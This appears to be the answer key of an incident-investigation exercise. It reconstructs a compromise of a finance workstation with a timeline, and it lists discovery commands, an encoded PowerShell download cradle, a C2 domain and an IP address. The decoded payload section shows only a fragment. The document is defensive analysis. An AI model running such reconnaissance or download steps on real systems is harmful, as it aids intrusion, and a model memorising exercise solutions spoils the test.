# Investigation Solution & Dossier

## 1. Executive Summary
On 2026-10-03 at 03:14:22 UTC, compromised credentials for `CORP\jdoe` were utilized to establish an interactive logon (LogonType 2) on `WS-FIN-01`. The adversary executed discovery commands (`whoami /all`, `net user /domain`) followed by an obfuscated PowerShell download cradle. The process resolved `update-service-telemetry.org` and established an encrypted C2 connection to `198.51.100.42:443`.

## 2. Decoded Payload
```powershell
$client=New-Object Net.WebClient;
```

## 3. Forensic Chronology
| Timestamp (UTC) | Action | Indicator |
| :--- | :--- | :--- |
| 03:14:22 | User Logon | User `CORP\jdoe` |
| 03:15:05 | Privilege Discovery | `whoami /all` |
| 03:15:40 | Domain Reconnaissance | `net user /domain` |
| 03:16:15 | Encoded Execution | `powershell.exe -NoP -Enc ...` |
| 03:16:18 | DNS Resolution | `update-service-telemetry.org` |
| 03:16:22 | C2 Network Socket | `198.51.100.42:443` |
